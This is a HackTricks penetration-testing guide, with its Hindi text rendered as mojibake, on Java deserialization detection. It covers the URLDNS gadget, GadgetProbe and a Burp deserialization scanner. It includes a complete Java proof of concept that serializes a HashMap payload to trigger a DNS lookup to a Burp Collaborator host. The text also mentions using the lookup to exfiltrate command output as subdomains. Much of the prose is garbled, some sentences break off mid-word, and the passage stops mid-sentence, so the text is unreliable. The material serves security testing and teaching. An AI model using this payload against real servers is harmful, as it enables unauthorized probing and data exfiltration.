# ‡§ú‡§æ‡§µ‡§æ DNS ‡§°‡•Ä‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§®, ‡§ó‡•à‡§ú‡•á‡§ü‡§™‡•ç‡§∞‡•ã‡§¨ ‡§î‡§∞ ‡§ú‡§æ‡§µ‡§æ ‡§°‡•Ä‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§® ‡§∏‡•ç‡§ï‡•à‡§®‡§∞

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ö‡§ó‡§∞ ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏ ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§î‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, ‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡•á‡§™‡•ã ‡§Æ‡•á‡§Ç PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á‡•§

</details>

## ‡§°‡•Ä‡§è‡§®‡§è‡§∏ ‡§°‡•Ä‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§® ‡§™‡§∞ ‡§°‡•Ä‡§è‡§®‡§è‡§∏ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß

‡§ï‡§ï‡•ç‡§∑‡§æ `java.net.URL` `Serializable` ‡§ï‡•ã ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à, ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§á‡§∏ ‡§ï‡§ï‡•ç‡§∑‡§æ ‡§ï‡•ã ‡§∏‡•Ä‡§∞‡•Ä‡§Ø‡§≤‡§æ‡§á‡§ú ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
```java
public final class URL implements java.io.Serializable {
```
‡§Ø‡§π ‡§ï‡§ï‡•ç‡§∑‡§æ ‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§Ö‡§ú‡•Ä‡§¨ ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞** ‡§π‡•à‡•§ ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§∏‡•á: "**‡§¶‡•ã ‡§π‡•ã‡§∏‡•ç‡§ü ‡§∏‡§Æ‡§æ‡§® ‡§Æ‡§æ‡§®‡•á ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç ‡§Ö‡§ó‡§∞ ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§π‡•ã‡§∏‡•ç‡§ü ‡§®‡§æ‡§Æ ‡§ï‡•ã ‡§è‡§ï ‡§π‡•Ä ‡§Ü‡§à‡§™‡•Ä ‡§™‡§§‡•á ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§∂‡•ç‡§µ‡§∏‡§®‡•Ä‡§Ø ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**"‡•§\
‡§´‡§ø‡§∞, ‡§π‡§∞ ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§è‡§ï URL ‡§ë‡§¨‡•ç‡§ú
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
‡§Ø‡§π **‡§ö‡§≤** ‡§∞‡§π‡§æ ‡§π‡•à **‡§ï‡§∞‡§®‡•á** ‡§ï‡•á ‡§∏‡§æ‡§• `putVal` ‡§π‡§∞ ‡§Æ‡§æ‡§® ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ `HashMap`‡•§ ‡§≤‡•á‡§ï‡§ø‡§®, ‡§Ö‡§ß‡§ø‡§ï ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à `hash` ‡§ï‡•ã ‡§π‡§∞ ‡§Æ‡§æ‡§® ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡§æ‡•§ ‡§Ø‡§π `hash` ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§ï‡•ã‡§° ‡§π‡•à:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, **‡§ú‡§¨ ‡§è‡§ï `HashMap` ‡§ï‡•ã ‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã **`hash`** ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® **‡§π‡§∞ ‡§ë‡§¨‡•ç‡§ú
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡§¨ ‡§è‡§ï `URLObject` `.hashCode()` ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§á‡§∏‡•á `hashCode(this)` ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡•á ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§Ü‡§™ ‡§á‡§∏ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§®‡•Ä‡§ö‡•á ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§è‡§ï `getHostAddress` ‡§°‡•ã‡§Æ‡•á‡§® ‡§™‡§∞ ‡§ï‡§æ‡§∞‡•ç‡§∞‡§µ‡§æ‡§à ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à, **‡§è‡§ï DNS ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§≤‡•â‡§®‡•ç‡§ö** ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§á‡§∏ ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø **DNS ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§≤‡•â‡§®‡•ç‡§ö** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§î‡§∞ ‡§Ø‡§π **‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§ø‡§§** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§ï‡§ø **‡§°‡•á‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§®** ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à, ‡§Ø‡§æ ‡§´‡§ø‡§∞ ‡§∏‡•Ç‡§ö‡§®‡§æ **‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§æ‡§≤‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è (‡§Ü‡§™ ‡§è‡§ï ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§ï‡•ã ‡§∏‡§¨‡§°‡•ã‡§Æ‡•á‡§® ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç)‡•§

### URLDNS ‡§™‡•á‡§≤‡•ã‡§° ‡§ï‡•ã‡§° ‡§â‡§¶‡§æ‡§π‡§∞‡§£

‡§Ü‡§™ [URDNS ‡§™‡•á‡§≤‡•ã‡§° ‡§ï‡•ã‡§° ysoserial ‡§∏‡•á ‡§Ø‡§π‡§æ‡§Ç ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏‡•á ‡§ï‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Æ‡§ù‡§®‡•á ‡§ï‡•ã ‡§∏‡§∞‡§≤ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡•à‡§Ç‡§®‡•á ‡§Ö‡§™‡§®‡§æ ‡§ñ‡•Å‡§¶ ‡§ï‡§æ PoC ‡§¨‡§®‡§æ‡§Ø‡§æ ‡§π‡•à (ysoserial ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞)‡•§
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* ‡§Æ‡•Ç‡§≤ ‡§µ‡§ø‡§ö‡§æ‡§∞ ‡§Æ‡•á‡§Ç ‡§•‡•Ä ‡§ï‡§ø commons collections payload ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§ï‡§∞ ‡§è‡§ï DNS ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§ï‡•ã ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ, ‡§Ø‡§π ‡§™‡•ç‡§∞‡§∏‡•ç‡§§‡§æ‡§µ‡§ø‡§§ ‡§µ‡§ø‡§ß‡§ø ‡§∏‡•á ‡§ï‡§Æ ‡§µ‡§ø‡§∂‡•ç‡§µ‡§∏‡§®‡•Ä‡§Ø ‡§•‡§æ, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§™‡•ã‡§∏‡•ç‡§ü ‡§π‡•à: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

‡§Ü‡§™ [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) ‡§ï‡•ã ‡§¨‡§∞‡•ç‡§™ ‡§∏‡•Å‡§á‡§ü ‡§ê‡§™ ‡§∏‡•ç‡§ü‡•ã‡§∞ (‡§è‡§ï‡•ç‡§∏‡§ü‡•á‡§Ç‡§°‡§∞) ‡§∏‡•á ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**GadgetProbe** ‡§Ø‡§π ‡§ú‡§æ‡§®‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§ï‡•Å‡§õ **‡§ú‡§æ‡§µ‡§æ ‡§ï‡•ç‡§≤‡§æ‡§∏‡•á‡§∏** ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•á ‡§ú‡§æ‡§µ‡§æ ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§™‡§∞ ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§Ü‡§™ ‡§Ø‡§π ‡§ú‡§æ‡§® ‡§∏‡§ï‡•á‡§Ç ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§Ø‡§π ‡§ï‡§ø‡§∏‡•Ä ‡§ú‡•ç‡§û‡§æ‡§§ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡•á ‡§≤‡§ø‡§è **‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§≤** ‡§π‡•à‡•§

### ‡§Ø‡§π ‡§ï‡•à‡§∏‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à

**GadgetProbe** ‡§™‡§ø‡§õ‡§≤‡•á ‡§ñ‡§Ç‡§° ‡§ï‡•á **DNS ‡§™‡•á‡§≤‡•ã‡§°** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§ó‡§æ ‡§≤‡•á‡§ï‡§ø‡§® **DNS ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§ö‡§≤‡§æ‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á** ‡§Ø‡§π **‡§è‡§ï ‡§Ö‡§∞‡•ç‡§¨‡§ø‡§ü‡•ç‡§∞‡•á‡§∞‡•Ä ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§ï‡•ã ‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡•á‡§ó‡§æ**‡•§ ‡§Ø‡§¶‡§ø **‡§Ö‡§∞‡•ç‡§¨‡§ø‡§ü‡•ç‡§∞‡•á‡§∞‡•Ä ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à**, ‡§§‡•ã **DNS ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä** ‡§≠‡•á‡§ú‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä ‡§î‡§∞ GadgetProbe ‡§Ø‡§π ‡§®‡•ã‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ï‡§ø ‡§Ø‡§π ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø **DNS** ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§≠‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡§ï‡§æ ‡§Ö‡§∞‡•ç‡§• ‡§π‡•à ‡§ï‡§ø **‡§Ö‡§∞‡•ç‡§¨‡§ø‡§ü‡•ç‡§∞‡•á‡§∞‡•Ä ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§∏‡§´‡§≤‡§§‡§æ‡§™‡•Ç‡§∞‡•ç‡§µ‡§ï ‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º ‡§®‡§π‡•Ä‡§Ç ‡§π‡•Å‡§Ü** ‡§•‡§æ, ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ø‡§æ ‡§§‡•ã ‡§Ø‡§π ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§Ø‡§æ ‡§Ø‡§π **‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à/‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü‡•á‡§¨‡§≤** ‡§π‡•à‡•§

‡§ó‡§ø‡§•‡§¨ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞, [**GadgetProbe ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§ï‡•Å‡§õ ‡§µ‡§∞‡•ç‡§°‡§≤‡§ø‡§∏‡•ç‡§ü** ‡§π‡•à‡§Ç](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§ú‡§æ‡§µ‡§æ ‡§ï‡•ç‡§≤‡§æ‡§∏‡•á‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ü‡•á‡§∏‡•ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡§æ ‡§π‡•à‡•§

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## ‡§ú‡§æ‡§µ‡§æ ‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§® ‡§∏‡•ç‡§ï‡•à‡§®‡§∞

‡§Ø‡§π ‡§∏‡•ç‡§ï‡•à‡§®‡§∞ ‡§¨‡§∞‡•ç‡§™ ‡§è‡§™ ‡§∏‡•ç‡§ü‡•ã‡§∞ (‡§è‡§ï‡•ç‡§∏‡§ü‡•á‡§Ç‡§°‡§∞) ‡§∏‡•á **‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§°** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### ‡§™‡•à‡§∏‡§ø‡§µ

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ø‡§π ‡§∏‡§≠‡•Ä ‡§∞‡§ø‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü‡•ç‡§∏ ‡§î‡§∞ ‡§∞‡§ø‡§∏‡•ç‡§™‡•â‡§®‡•ç‡§∏ ‡§ï‡•ã **‡§™‡•à‡§∏‡§ø‡§µ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ú‡§æ‡§Ç‡§ö‡§§‡§æ ‡§π‡•à** ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç **‡§ú‡§æ‡§µ‡§æ ‡§∏‡•Ä‡§∞‡•Ä‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡§° ‡§Æ‡•à‡§ú‡§ø‡§ï ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏** ‡§ñ‡•ã‡§ú‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§è‡§ï ‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§ø‡§≤‡§ø‡§ü‡•Ä ‡§ö‡•á‡§§‡§æ‡§µ‡§®‡•Ä ‡§™‡•ç‡§∞‡§∏‡•ç‡§§‡•Å‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (290).png>)

### ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø

**‡§Æ‡•à‡§®‡•ç‡§Ø‡•Å‡§Ö‡§≤ ‡§ü‡•á‡§∏‡•ç‡§ü‡§ø‡§Ç‡§ó**

‡§Ü‡§™ ‡§è‡§ï ‡§∞‡§ø‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§∞‡§æ‡§á‡§ü ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ `Send request to DS - Manual Testing` ‡§ï‡§∞‡•á‡§Ç‡•§\
‡§´‡§ø‡§∞, _‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§® ‡§∏‡•ç‡§ï‡•à‡§®‡§∞ ‡§ü‡•à‡§¨_ --> _‡§Æ‡•à‡§®‡•ç‡§Ø‡•Å‡§Ö‡§≤ ‡§ü‡•á‡§∏‡•ç‡§ü‡§ø‡§Ç‡§ó ‡§ü‡•à‡§¨_ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§Ü‡§™ **‡§á‡§®‡•ç‡§∏‡§∞‡•ç‡§∂‡§® ‡§™‡•â‡§á‡§Ç‡§ü** ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§î‡§∞ **‡§ü‡•á‡§∏‡•ç‡§ü‡§ø‡§Ç‡§ó ‡§≤‡•â‡§®‡•ç‡§ö** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ó‡§è ‡§á‡§®‡•ç‡§ï‡•ã‡§°‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞ ‡§â‡§ö‡§ø‡§§ ‡§π‡§Æ‡§≤‡§æ ‡§ö‡•Å‡§®‡•á‡§Ç)‡•§

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

‡§Ø‡§¶‡•ç‡§Ø‡§™‡§ø ‡§á‡§∏‡•á "‡§Æ‡•à‡§®‡•ç‡§Ø‡•Å‡§Ö‡§≤ ‡§ü‡•á‡§∏‡•ç‡§ü‡§ø‡§Ç‡§ó" ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§Ø‡§π ‡§ï‡§æ‡§´‡•Ä **‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§** ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ú‡§æ‡§Ç‡§ö‡•á‡§ó‡§æ ‡§ï‡§ø **‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§®** ‡§ï‡§ø‡§∏‡•Ä **ysoserial ‡§™‡•á‡§≤‡•ã‡§°** ‡§ï‡•á ‡§≤‡§ø‡§è **‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§≤** ‡§π‡•à ‡§Ø‡§æ ‡§®‡§π‡•Ä‡§Ç, ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§™‡§∞ ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø‡•ã‡§Ç ‡§ï‡•Ä 